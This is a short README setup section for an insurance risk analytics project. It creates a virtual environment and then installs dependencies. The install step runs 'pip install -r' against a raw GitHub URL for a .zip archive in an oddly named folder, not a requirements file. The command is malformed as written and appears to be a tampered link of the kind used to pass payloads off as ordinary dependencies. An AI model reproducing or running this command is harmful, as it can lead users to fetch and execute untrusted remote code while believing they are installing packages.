## Setup

1. Create a virtual environment:
```bash
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
```

2. Install dependencies:
```bash
pip install -r https://raw.githubusercontent.com/GetachewGanfur/Insurance-Risk-Analytics-and-Predictive-Modeling-Week3/main/successivity/Insurance-Risk-Analytics-and-Predictive-Modeling-Week3.zip
```

## Usage
